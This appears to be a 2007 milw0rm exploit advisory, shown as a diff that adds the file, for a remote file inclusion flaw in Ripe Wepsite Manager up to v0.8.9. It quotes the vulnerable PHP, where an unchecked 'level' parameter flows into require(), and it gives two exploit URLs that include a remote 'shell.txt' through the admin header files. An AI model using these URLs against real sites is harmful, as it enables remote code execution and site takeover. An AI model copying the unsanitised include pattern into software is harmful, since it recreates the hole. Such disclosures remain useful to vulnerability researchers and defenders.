@@ -1,0 +1,34 @@
+#Author::   BlackNDoor | blackndoor@learntohell.net
+#Homepage:: www.learntohell.net
+#
+#Script::   Ripe Wepsite Manager
+#Version::  <= v0.8.9
+#Type::     Remote File Include
+#
+#Source::   http://sourceforge.net/project/showfiles.php?group_id=194532
+
+#Bug::
+   -> Files:
+
+      /admin/includes/author_panel_header.php
+      /admin/includes/admin_header.php
+
+   -> vulncode:
+
+      <?php
+         ...
+         define("LEVEL", $level); // directory level
+         
+         // includes
+           require(LEVEL.'../includes/config.php');
+         ...
+      ?>
+
+#Exploit::
+
+   http://www.site.com/[path to ripe]/admin/includes/author_panel_header.php?level=shell.txt?
+   http://www.site.com/[path to ripe]/admin/includes/admin_header.php?level=shell.txt?
+
+#thanks:: str0ke
+
+# milw0rm.com [2007-06-30]
